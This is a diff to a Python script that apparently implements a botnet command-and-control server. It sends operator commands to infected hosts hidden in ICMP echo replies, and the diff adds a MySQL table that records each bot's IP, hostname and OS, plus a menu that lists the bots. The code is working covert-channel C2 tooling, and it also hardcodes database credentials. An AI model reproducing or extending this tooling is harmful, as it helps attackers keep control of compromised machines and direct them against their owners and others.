@@ -8,6 +8,7 @@
 
 from multiprocessing import *
 import threading
+import MySQLdb
 import ctypes
 import sys
 import signal
@@ -38,6 +39,13 @@ def handler(signum, frame):
 
 # Command and Control main function
 def c2main(command):
+	db = MySQLdb.connect(host="localhost", # your host, usually localhost
+                     user="pingc2user", # your username
+                     passwd="pingc2user", # your password
+                     db="pingc2") # name of the data base
+        # you must create a Cursor object. It will let
+        #  you execute all the query you need
+        cur = db.cursor()
 	print ""
         print "[*] Command received from C2: %s" % command.value
 	while True:
@@ -56,9 +64,9 @@ def c2main(command):
 				if request == 'What shall I do master?':
 					#command=updateCommand()
 					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(command.value)
-                                	print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
                                 	#resp.show2()
                                 	send(resp)
+					print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
 					displayMenu()
 					print "Option: "
                         	elif request == 'Checkin':
@@ -66,9 +74,24 @@ def c2main(command):
 					print "\n[*] %s checking in" % p['IP'].src
 				elif 'sysinfo' in request:
 					# Build sysinfo capture system database
-                        		sysinfo = request[8:]
+                        		#print "[D] Inside sysinfo"
+					sysinfo = request[8:].split()					
+					print "[D] Sysinfo[0]: " + sysinfo[0]
                                 	print "\n[*] Received sysinfo from client: %s" % sysinfo
-                                	resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
+					cur.execute("select * from bots where name=%s and remoteip=%s",(sysinfo[1],p['IP'].src))
+                        		row = cur.fetchall()
+                        		#print "[D] Row: ", row
+					if not row :
+                                		try:
+							cur.execute("""insert into bots (remoteip,name,os) values(%s,%s,%s)""",(p['IP'].src,sysinfo[1],sysinfo[0]))
+                                        		db.commit()
+							print "[*] Adding machine from IP: ",p['IP'].src
+                                		except: 
+							print "[*] Machine already exists, ignoring"
+					else:
+						print "[*] Machine already exists, ignoring"
+	
+					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
                                 	#resp.show2()
                                 	print "\n[*] Response sent: Thanks"
                                 	send(resp)
@@ -95,6 +118,13 @@ def main(argv):
 	print "	 		Command Center              "
 	print "	 		   by NoCow		    "
 	print "	--------------------------------------------"
+	db = MySQLdb.connect(host="localhost", # your host, usually localhost
+                     user="pingc2user", # your username
+                     passwd="pingc2user", # your password
+                     db="pingc2") # name of the data base
+        # you must create a Cursor object. It will let
+        #  you execute all the query you need
+        cur = db.cursor()
 	manager = Manager()
 	command = manager.Namespace()
 	command.value = 'sysinfo'
@@ -131,6 +161,11 @@ def main(argv):
 					print "[X] Error starting C2 listener"
 		elif option == '2':
 			print "[*] Displaying bots!"
+			cur.execute("select remoteip,localip,name,os from bots")
+			print "RemoteIP	LocalIP	Name	OS"
+			print "--------------------------------------"
+			for row in cur.fetchall():
+				print"%s	%s	%s	%s" % (row[0],row[1],row[2],row[3])
 		elif option == '3':
                         if process.is_alive():
                         	command.value = raw_input("Enter a command: ")
